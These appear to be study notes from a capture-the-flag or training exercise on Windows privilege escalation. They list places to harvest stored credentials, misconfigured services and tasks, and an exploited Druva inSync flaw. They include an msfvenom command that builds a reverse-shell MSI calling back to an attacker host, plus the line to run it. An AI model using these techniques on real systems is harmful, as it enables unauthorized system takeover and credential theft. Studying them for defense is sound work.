# **Windows Privilege Escalation**

- privilege escalation consists of using given access to a host with "user A" and leveraging it to gain access to "user B" by abusing a weakness in the target system. While we will usually want "user B" to have administrative rights, there might be situations where we'll need to escalate into other unprivileged accounts before actually getting administrative privileges.


## **Cases  of Windows Privilege Escalation**

-  Finding credentials in text files or spreadsheets left unsecured by some careless user  
- Misconfigurations on Windows services or scheduled tasks  
- Excessive privileges assigned to our account  
- Vulnerable software  
- Missing Windows security patches

## **Windows Users** 

- **Administrators :**   
1. Standard Users : access the computer but only perform limited tasks.  
- **SYSTEM / LocalSystem**  
1. Local Service : use anonymous connections over the network.  
2. Network Service: use the computer credentials to authenticate through the network.

## **Windows Services**

- Windows services are managed by the Service Control Manager (SCM).  
- SCM is a process mange the state of services as needed.  
- SCM checking the current status of  service  and way to configure services.


## **Discretionary Access Control Lists** 

- Discretionary Access Control Lists are used by Windows systems to specify who can access a given resource. While they are often referenced when talking about files, they also apply to other components as registry keys, services and scheduled tasks.

## **Finding Passwords on a Windows System**
- This guide explores various locations on a Windows system where an attacker might find passwords for privileged accounts.

### **Unattended Windows Installations:**

* Check for files like `C:\Unattend.xml` used during automated deployments. These might contain administrator credentials for the initial setup.

### **PowerShell History:**

* Past PowerShell commands, including those containing passwords, might be stored in `%userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`.

### **Saved Windows Credentials:**

* The `cmdkey /list` command lists saved credentials for other users. While passwords are not revealed, suspicious entries can be further tested with `runas /savecred`.  

### **IIS Configuration:**
- IIS (Internet Information Services) Configuration refers to the settings and parameters that determine how IIS, a web server software, functions. These configurations control various aspects of how IIS handles requests, processes content, and interacts with other applications.
* The `web.config` file (in locations like `C:\inetpub\wwwroot\web.config`) might contain database connection strings or authentication credentials for web applications.

### **PuTTY Configuration:**
- PuTTY Configuration refers to the settings and parameters that determine how PuTTY, a popular SSH and telnet client, functions. These configurations control various aspects of how PuTTY connects to remote servers, handles sessions, and displays information.

- * While PuTTY doesn't store SSH passwords, proxy configurations retrieved with `reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\` might contain cleartext usernames and passwords.


Privilege escalation can sometimes be straightforward due to misconfigurations, allowing access to higher privileges or even administrator rights. While these scenarios are more common in Capture The Flag (CTF) events than in real penetration testing, they can still be useful fallback methods.

## **Scheduled Tasks**

- By examining scheduled tasks, you might find one that uses a modifiable binary. For example, using the `schtasks` command, you can identify tasks and their executables. If you have permission to modify the executable, you can replace it with a payload to gain higher privileges.

## **AlwaysInstallElevated**

- Windows installer files (.msi) typically run with the privilege level of the user who starts them. However, they can be configured to run with elevated privileges from any user account, even unprivileged ones. This allows the creation of a malicious MSI file that can run with admin privileges.

- #### **Requirements**                                                                                                                                              To exploit this, two registry values must be set:

* `HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer`  
* `HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer`

You can check these values using the following commands:  
C:\\\> reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer  
C:\\\> reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer

#### **Exploitation Steps**

1. Generate a Malicious MSI File: Use `msfvenom` to create a reverse shell payload in an MSI file:   
   \`\`\`msfvenom \-p windows/x64/shell\_reverse\_tcp LHOST=ATTACKING\_MACHINE\_IP LPORT=LOCAL\_PORT \-f msi \-o malicious.msi\`\`\`  
2. Run the Malicious MSI File: Transfer the MSI file to the target machine and execute it: \`\`\`C:\\\> msiexec /quiet /qn /i C:\\Windows\\Temp\\malicious.msi \`\`\`  
3. Set Up a Listener: Ensure you have a listener set up on your attacking machine to catch the reverse shell.

Windows services are managed by the Service Control Manager (SCM). Each service has an associated executable that is run by the SCM when the service is started. Services have a DACL that specifies who has permission to start, stop, or modify the service.

## **Common ways to exploit Windows services:**

1. **Insecure permissions on service executable:** If the executable associated with a service has weak permissions, an attacker can modify or replace it to gain the privileges of the service's account.   
     
2. **Unquoted service paths:** If the path to the service's executable is not properly quoted, an attacker can create a malicious executable that the SCM will run instead of the intended executable.  
     
3. **Insecure service permissions:** If the service's DACL allows an attacker to modify the service's configuration, they can change the executable path or the account used to run the service.

### 

### **Insecure Permissions on Service Executable**

* **Vulnerability:** If the service's executable file has weak permissions, such as allowing the "Everyone" group to modify it, an attacker can overwrite it with a malicious payload.  
* **Exploitation:**  
  1. **Identify vulnerable services:** Use tools like `sc qc` to query service configurations and check the executable's permissions with `icacls`.  
  2. **Create malicious payload:** Generate a reverse shell or other malicious payload using tools like `msfvenom`.  
  3. **Replace executable:** Overwrite the service's executable with the malicious payload and grant appropriate permissions.  
  4. **Restart service:** Restart the service to execute the malicious payload.

### **Unquoted Service Paths**

* **Vulnerability:** If the service's executable path is not enclosed in quotation marks, the SCM may interpret it incorrectly, allowing attackers to inject additional commands or paths.  
* **Exploitation:**  
  1. **Identify vulnerable services:** Query service configurations and check for unquoted paths.  
  2. **Create malicious executable:** Place a malicious executable in a location that the SCM will search for.  
  3. **Restart service:** Restart the service, which will execute the malicious executable instead of the intended one.

## **Insecure Service Permissions**

* **Vulnerability:** If the service's DACL allows an attacker to modify its configuration, they can change the executable path or account.  
* **Exploitation:**  
  1. **Identify vulnerable services:** Use tools like `accesschk` to check the service's DACL.  
  2. **Create malicious payload:** Generate a reverse shell or other malicious payload.  
  3. **Modify service configuration:** Use `sc config` to change the service's executable path and account.  
  4. **Restart service:** Restart the service to execute the malicious payload.

### **Additional Considerations:**

* **Privilege Escalation:** These vulnerabilities can be used to gain higher privileges, such as SYSTEM, which can give attackers significant control over the system.  
* **Defense Mechanisms:** Organizations can mitigate these risks by regularly reviewing service configurations, applying security updates, and implementing access controls to restrict permissions.  
* **Detection and Response:** Security monitoring tools can help detect suspicious activity related to service modifications or unauthorized access. Incident response teams should be prepared to investigate and contain any breaches.

## **Unpatched Software**

- Use `wmic product get name,version,vendor` to list installed software and versions.  
- **Searching for Exploits:** Use online resources like exploit-db, packet storm, or Google to find known vulnerabilities for the discovered software.

### **Case Study: Druva inSync 6.6.3 Vulnerability**

The target machine runs Druva inSync 6.6.3, which has a privilege escalation vulnerability.

* **Vulnerability Details:**  
  * A patched vulnerability (originally reported for version 6.5.0) had an incomplete fix.  
  * An RPC server runs on port 6064 with SYSTEM privileges, allowing anyone on localhost to execute commands remotely.  
  * The patch intended to restrict commands to specific paths but could be bypassed using path traversal.  
* **Exploiting the Vulnerability:**  
  * The exploit communicates with port 6064 using a specific protocol.  
  * The exploit code is provided and can be executed on the target machine.  
  * The default exploit payload creates a user with limited privileges, but this can be modified for privilege escalation.  
  * A modified exploit creates a user with administrative privileges.

**Aftermath:**

* The exploit successfully creates a user with administrator access.  
* You can use the newly created user account to access the Administrator's desktop and retrieve the flag.